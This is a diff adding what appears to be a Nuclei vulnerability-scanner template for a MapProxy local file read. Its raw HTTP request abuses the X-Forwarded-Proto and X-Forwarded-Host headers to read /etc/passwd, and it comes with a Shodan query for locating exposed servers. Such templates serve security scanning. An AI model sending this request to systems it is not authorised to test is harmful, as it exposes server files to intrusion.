@@ -1,0 +1,39 @@
+id: mapproxy-file-read
+
+info:
+  name: MapProxy - File Read
+  author: xbow,DhiyaneshDk
+  severity: high
+  description: |
+    MapProxy improperly validates and processes X-Forwarded headers, allowing attackers to construct file:// URLs that bypass access controls and read local files.
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"MapProxy"
+  tags: mapproxy,oss,lfi
+
+http:
+  - raw:
+      - |
+        GET {{path}}?wms_capabilities&type=external HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Proto: file
+        X-Forwarded-Host: ///etc/passwd#.xml
+
+    payloads:
+      path:
+        - /
+        - /demo
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "MapProxy"
+        condition: and
+
+      - type: status
+        status:
+          - 200
